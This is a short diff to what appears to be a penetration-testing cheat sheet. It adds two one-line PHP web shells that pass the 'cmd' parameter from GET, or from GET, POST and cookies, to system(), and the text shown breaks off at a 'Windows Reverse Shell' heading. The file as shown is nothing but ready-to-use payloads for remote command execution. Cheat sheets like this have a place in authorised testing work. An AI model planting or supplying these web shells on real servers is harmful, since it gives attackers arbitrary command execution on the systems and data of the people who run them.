@@ -1,11 +1,13 @@
-
-system:
-shell_exec:
-
-Simple:
+Basic GET:
 
 ```bash
-<?php system($_GET['cmd']); ?>
+<?php SYSTEM($_GET['cmd']); ?>
+```
+
+Offers more flexibility (GET/POST/COOKIE):
+
+```bash
+<?php SYSTEM($_REQUEST['cmd']); ?>
 ```
 
 Windows Reverse Shell:
